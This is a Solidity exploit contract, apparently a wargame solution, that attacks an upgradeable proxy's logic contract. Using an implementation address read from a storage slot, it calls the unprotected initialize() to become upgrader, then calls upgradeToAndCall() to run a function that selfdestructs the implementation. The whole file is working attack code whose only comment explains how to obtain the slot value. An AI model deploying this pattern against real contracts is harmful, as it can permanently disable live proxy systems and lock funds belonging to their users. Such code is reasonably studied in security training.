pragma solidity ^0.8;

interface IEngine {
    function upgrader() external view returns (address);
    function initialize() external;
    function upgradeToAndCall(address newImplementation,bytes memory data) external payable;
}

contract Attack {
    
    function attack(bytes32 slotContent) external {

        //slot content is a bytes32 variable that contains the address of the implementation
        //it has to be extracted from the web console using getStorageAt()

        address a = address(uint160(uint256(slotContent)));
        IEngine target = IEngine(a);
        target.initialize();
        target.upgradeToAndCall(address(this), abi.encodeWithSelector(this.kill.selector));
    }

    function kill() external {
        selfdestruct(payable(address(0)));
    }

}
